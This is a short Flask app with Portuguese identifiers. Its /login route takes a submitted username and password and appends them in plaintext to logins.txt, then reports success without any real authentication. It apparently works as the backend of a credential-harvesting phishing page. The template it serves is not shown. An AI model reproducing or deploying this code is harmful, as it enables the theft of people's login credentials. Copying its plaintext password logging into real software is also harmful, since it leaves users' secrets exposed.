from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    usuario = request.form.get('usuario')
    senha = request.form.get('senha')
    
    # Salva no logins.txt
    with open('logins.txt', 'a') as f:
        f.write(f"[LOGIN] {usuario} | {senha}\n")
    
    return "Login recebido com sucesso!"

if __name__ == "__main__":
    app.run()
